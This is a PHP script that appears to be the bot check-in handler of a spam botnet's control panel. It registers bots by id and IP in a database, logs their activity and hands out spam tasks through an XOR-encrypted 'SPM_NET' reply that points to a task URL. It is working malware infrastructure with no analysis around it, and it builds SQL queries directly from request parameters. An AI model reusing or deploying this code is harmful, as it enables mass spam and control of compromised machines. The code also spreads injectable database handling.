<?
  
  function GetCountryInfo($ip)
  {
	$ip = sprintf("%u", ip2long($ip));
	$ci=array('name' => 'Unknown country', 'a2' => 'xx', 'a3' =>'---' );

	$sql="SELECT `country`,`a2`,`a3` FROM `ip2country` WHERE `ipfrom`<=$ip AND `ipto`>=$ip LIMIT 0, 1";
	$query=mysql_query($sql);
	if($row = mysql_fetch_row($query))
	{
	        $ci['name']=$row[0];
	        $ci['a2']=$row[1];
	        $ci['a3']=$row[2];
	}
	return $ci;
  }
  
  
  
  function ip2int($ip) {

   $a=explode(".",$ip);

   return $a[0]*256*256*256+$a[1]*256*256+$a[2]*256+$a[3];

   }
  
  
  
  $id=$_GET['id'];
  $tick=$_GET['tick'];
  $task=$_GET['task'];
  $smtp=$_GET['smtp'];
  $ver=$_GET['ver'];
  
 
      $ip=$_SERVER['REMOTE_ADDR'];
      $time=date("U");
      $host=$ip; //gethostbyaddr($ip);
      
      
      require("cfg.php");
      $status_in_success = 0;
      $status_in_process = 1;
      
      
      function CryptData($str,$key) {
        $j = 0;
        $newstr = "";
        for ($i=0; $i < strlen($str); $i++) {
	
	$symb = ord($str[$i]) ^ ord($key[$j]) + 32;
	      
	$newstr .=  str_pad(dechex($symb), 2, '0', STR_PAD_LEFT);
	$j++;
	if ($j == strlen($key)) $j = 0;
        }
        return  strtoupper($newstr);
      }
    
      
      $block_fg = 0;
      
      
      $res = @mysql_query("SELECT * FROM robo WHERE `id` = '$id';");
      $Row = @mysql_fetch_array($res);
      if (!$Row)
      {                              
        @mysql_query("INSERT INTO robo (id,ip,tick,time,smtp,ver, bl) VALUES ('$id','$ip','$tick','$time','$smtp','$ver', '0');");        
      }
      else
      {    
        
        $block_fg = $Row["bl"];
        @mysql_query("UPDATE robo SET `time`='$time', `ip`='$ip', `tick`='$tick', `smtp`='$smtp', `ver`='$ver' WHERE `id`='$id';");
        
      }
      $ip = $_SERVER['REMOTE_ADDR'];
      if ($log_activity)
	      @mysql_query("INSERT INTO BotActivity (DateTime,BotId,BotVer,ActivityType,AdditionalId,IP) VALUES ('".date("Y-m-d H:i:s")."','$id','$ver','1','','$ip');");
      
      
      if (isset($task) || ($smtp === "bad") || ($block_fg == 1)) $SYGNATURE = "SPM_NET;";
      else {
        $tasks = @mysql_query("SELECT * FROM tasks WHERE (`status` = $status_in_process) LIMIT 1;");
        if (@mysql_num_rows($tasks) > 0) {
	$SYGNATURE = "SPM_NET=http://$server/spm/s_tasks.php?id=$id&ver=$ver;";
        } else {
	$SYGNATURE = "SPM_NET;";
        }
      }
      mysql_close($dbase);
      echo CryptData($SYGNATURE,$id);
       
    
   
?>
